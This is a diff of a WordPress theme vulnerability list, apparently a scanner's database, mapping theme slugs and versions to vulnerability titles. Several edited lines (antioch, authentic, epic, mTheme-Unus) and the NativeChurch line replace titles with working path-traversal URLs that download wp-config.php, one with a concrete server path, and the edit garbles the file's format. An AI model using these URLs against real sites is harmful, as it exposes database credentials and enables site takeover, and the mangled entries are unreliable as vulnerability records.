@@ -1,8 +1,8 @@
 5star|all|5star by Templatic - CSRF File Upload
 adifier-system|< 3.1.4|Adifier System < 3.1.4 - Unauthenticated Local File Inclusion
 aidreform|all|Multiple themes - Unauthenticated Arbitrary File Upload
-antioch|all|Antioch Theme - Arbitrary File Download
-authentic|all|Authentic Theme - Arbitrary File Download
+antioch|all|/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php 
+authentic|all|/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php 
 beauty-premium|= 1.0.8|Beauty & Clean Theme 1.0.8 - Arbitrary File Upload
 bolster|all|Multiple themes - Unauthenticated Arbitrary File Upload
 bootstrap-ultimate|<= 1.4.9|Bootstrap Ultimate <= 1.4.9 - Unauthenticated Limited Local File Inclusion
@@ -14,7 +14,7 @@ clockstone|<= 1.2|Clockstone <= 1.2 - Arbitrary File Upload
 dailydeal|all|DailyDeal - File Upload Remote Code Execution
 deep-blue|= 1.9.2|Deep-Blue 1.9.2 - Arbitrary File Upload
 designfolio-plus|<= 1.2|DesignFolio Plus Theme <= 1.2 - Arbitrary File Upload
-epic|all|epic Theme - Arbitrary File Download
+epic|all|epic Theme - Arbitrary File Download && /wp-content/themes/epic/includes/download.php?file=/home/content/46/8992446/html/wp-config.php 
 estrutura-basica|all|Estrutura-Basica - Local File Download
 focusblog|< 2.0.0|All Thrive Themes Legacy Themes < 2.0.0 - Unauthenticated Arbitrary File Upload and Option Deletion
 footysquare|all|Multiple themes - Unauthenticated Arbitrary File Upload
@@ -30,7 +30,7 @@ meta-news|< 1.1.8|Meta News < 1.1.8 - Unauthenticated Local File Inclusion
 method|all|WordPress Slider Revolution - Local File Disclosure
 minus|< 2.0.0|All Thrive Themes Legacy Themes < 2.0.0 - Unauthenticated Arbitrary File Upload and Option Deletion
 motor|< 3.1.0|Motor theme < 3.1.0 - Unauthenticated Local File Inclusion
-mTheme-Unus|all|mTheme-Unus Theme - Local File Inclusion (LFI)
+mTheme-Unus|all|/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php
 NativeChurch|all|/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php
 neosense|< 1.8|Neosense Theme < 1.8 - Unrestricted File Upload
 newscard|< 1.4|NewsCard < 1.4 - Unauthenticated Local File Inclusion
